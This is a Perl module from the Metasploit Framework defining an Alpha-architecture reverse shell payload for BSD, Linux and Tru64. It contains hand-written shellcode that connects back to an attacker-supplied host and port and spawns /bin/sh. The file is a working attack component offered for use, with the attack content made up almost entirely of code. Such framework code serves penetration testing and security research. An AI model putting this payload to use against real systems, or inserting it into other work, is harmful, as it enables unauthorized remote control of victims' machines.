
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::generic_alpha_reverse;

use base 'Msf::PayloadComponent::ReverseConnection';
use strict;
use Pex::Alpha;

my $info =
{
  'Name'         => 'BSD/Linux/Tru64 Alpha Reverse Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
  'Arch'         => [ 'alpha' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd', 'linux', 'tru64' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $host = shift;
  my $port = shift;

  my $host_bin = unpack("V", gethostbyname($host));
 
  my $shellcode =
    "\x10\x54\xe0\x43\x11\x34\xe0\x43\x12\x04\xff\x47\x00\x34\xec\x43".
    "\x83\x00\x00\x00".
    Pex::Alpha::ldah("a0", unpack("n", pack("v", $port)) << 16, "t0").
    Pex::Alpha::set($host_bin, "t1").
    "\x00\x00\x3e\xb0\x04\x00\x5e\xb0\x10\x04\xe0\x47\x11\x04\xfe\x47".
    "\x12\x14\xe2\x43\x00\x54\xec\x43\x83\x00\x00\x00\x11\x74\xe0\x43".
    "\x31\x35\x20\x42\x00\x54\xeb\x43\x83\x00\x00\x00\xfc\xff\x3f\xf6".
    "\x12\x04\xff\x47\x02\x00\x00\xd2\x2f\x62\x69\x6e\x2f\x73\x68\x00".
    "\x31\x15\xc2\x43\xf0\xff\x1e\xb6\xf8\xff\x5e\xb6\x00\x74\xe7\x43".
    "\x83\x00\x00\x00";

  return $shellcode;
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('127.0.0.1', 4444);
  return(length($bin));
}

1;
